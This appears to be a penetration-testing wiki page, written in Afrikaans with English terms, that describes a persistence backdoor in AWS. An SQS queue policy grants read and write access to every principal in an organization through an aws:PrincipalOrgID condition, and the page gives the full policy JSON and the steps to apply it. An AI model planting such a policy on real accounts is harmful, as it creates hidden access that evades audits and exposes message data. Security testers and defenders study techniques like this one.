# AWS - SQS OrgID Policy Backdoor

{{#include ../../../../banners/hacktricks-training.md}}

Misbruik 'n SQS queue resource policy om stilweg Send, Receive and ChangeMessageVisibility toe te ken aan enige principal wat tot 'n teiken AWS Organization behoort deur die condition aws:PrincipalOrgID te gebruik. Dit skep 'n org-scoped hidden path wat dikwels kontroles ontduik wat slegs kyk na explicit account or role ARNs or star principals.

### Backdoor policy (heg dit aan die SQS queue policy)
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "OrgScopedBackdoor",
"Effect": "Allow",
"Principal": "*",
"Action": [
"sqs:ReceiveMessage",
"sqs:SendMessage",
"sqs:ChangeMessageVisibility",
"sqs:GetQueueAttributes"
],
"Resource": "arn:aws:sqs:REGION:ACCOUNT_ID:QUEUE_NAME",
"Condition": {
"StringEquals": { "aws:PrincipalOrgID": "o-xxxxxxxxxx" }
}
}
]
}
```
### Stappe
- Verkry die Organization ID met die AWS Organizations API.
- Kry die SQS queue ARN en stel die queue policy in, insluitend die stelling hierbo.
- Van enige principal wat tot daardie Organization behoort, stuur en ontvang 'n boodskap in die queue om toegang te valideer.

### Impak
- Organisasie-wye versteekte toegang om SQS-boodskappe te lees en te skryf vanaf enige rekening in die gespesifiseerde AWS Organization.

{{#include ../../../../banners/hacktricks-training.md}}
